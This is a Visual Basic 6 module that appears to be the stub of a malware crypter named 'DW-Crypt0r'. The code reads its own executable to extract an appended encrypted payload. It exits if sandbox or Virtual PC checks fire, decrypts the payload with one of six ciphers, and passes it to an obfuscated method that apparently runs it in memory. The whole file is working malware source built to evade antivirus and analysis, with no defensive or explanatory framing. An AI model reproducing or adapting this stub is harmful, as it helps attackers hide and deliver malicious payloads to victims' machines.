Attribute VB_Name = "Stb"
Option Explicit

Sub Main()
    
    Dim Free         As Long
    Dim Data         As String
    Dim Datos()      As String
    Dim Antis()      As String
    Dim hRC4         As New clsRC4
    Dim hXOR         As New clsXOR
    Dim hTEA         As New clsTEA
    Dim hDES         As New clsDES
    Dim hGost        As New clsGost
    Dim hRIJ         As New clsRijndael
    Dim RASDFKASDFAS As New Class2
    
    Free = FreeFile
    
    Open App.Path & "\" & App.EXEName & ".exe" For Binary As Free
        
        Data = Space$(LOF(1))
        Get #1, , Data
        
    Close Free
    
    Datos() = Split(Data, "[DW-Crypt0r]")
    
    Antis() = Split(Datos(2), "[Antis]")
    
    If Antis(0) = 1 Then
        
        If isinsandboxEs = 1 Then End
    
    End If
    
    If Antis(1) = 1 Then
        
        If isinsandboxEs = 2 Then End
        
    End If
    
    If Antis(2) = 1 Then
    
        If isinsandboxEs = 3 Then End
        
    End If
    
    If Antis(3) = 1 Then
    
        If isinsandboxEs = 4 Then End
    
    End If
    
    If Antis(4) = 1 Then
        If isinsandboxEs = 5 Then End
        
    End If
    
    If Antis(5) = 1 Then
        
        If IsVirtualPCPresent = 1 Then End
        
    End If
    
    If Antis(6) = 1 Then
        
        If IsVirtualPCPresent = 2 Then End
    
    End If
    
    If Antis(7) = 1 Then
        
        If IsVirtualPCPresent = 3 Then End
    
    End If
    
    If Datos(4) = 1 Then Datos(1) = hDES.DecryptString(Datos(1), Datos(3))
    If Datos(4) = 2 Then Datos(1) = hGost.DecryptString(Datos(1), Datos(3))
    If Datos(4) = 3 Then Datos(1) = hRC4.DecryptString(Datos(1), Datos(3))
    If Datos(4) = 4 Then Datos(1) = hRIJ.DecryptString(Datos(1), Datos(3))
    If Datos(4) = 5 Then Datos(1) = hTEA.DecryptString(Datos(1), Datos(3))
    If Datos(4) = 6 Then Datos(1) = hXOR.DecryptString(Datos(1), Datos(3))
    
    RASDFKASDFAS.WISDFNASDKFJAKSDFJKADFKAJDSFKAJSDFJKADSFJASD StrConv(Datos(1), vbFromUnicode), vbNullString
    
End Sub
